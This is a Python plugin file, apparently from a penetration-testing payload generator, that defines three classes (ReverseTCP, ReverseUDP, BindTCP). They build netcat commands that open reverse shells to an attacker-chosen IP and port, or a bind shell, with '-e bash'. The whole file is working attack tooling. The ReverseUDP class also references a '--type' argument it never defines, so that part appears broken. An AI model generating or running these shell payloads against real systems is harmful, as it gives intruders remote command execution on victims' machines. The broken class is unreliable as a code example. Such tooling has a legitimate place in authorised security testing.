from ogabog.cores import plugin, const


class ReverseTCP(plugin.ReverseShell):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--type",
            default="ncat",
            choices=[
                'nc',
                'ncat'
            ],
            help="Select netcat type: tradition, ncat (default: ncat)"
        )
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.opts.description = "[ReverseShell][TCP] Netcat from swisskyrepo/PayloadsAllTheThings. License MIT."
        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"

    def make_shell(self):
        self.shell = "{} {} {} -e {}".format(self.args.type, self.args.ip, self.args.port, self.args.shell)


class ReverseUDP(plugin.ReverseShell):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.is_udp = True
        self.opts.description = "[ReverseShell][UDP] Netcat from swisskyrepo/PayloadsAllTheThings. License MIT."
        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"

    def make_shell(self):
        self.shell = "{} --udp {} {} -e {}".format(self.args.type, self.args.ip, self.args.port, self.args.shell)


class BindTCP(plugin.BindShell):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.add_args(
            "--type",
            default="ncat",
            choices=[
                'nc',
                'ncat'
            ],
            help="Select netcat type: tradition, ncat (default: ncat)"
        )
        self.opts.description = "[BindShell][TCP] Netcat from swisskyrepo/PayloadsAllTheThings. License MIT."
        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"

    def make_shell(self):
        self.shell = "{} -l {} -e {}".format(self.args.type, self.args.port, self.args.shell)
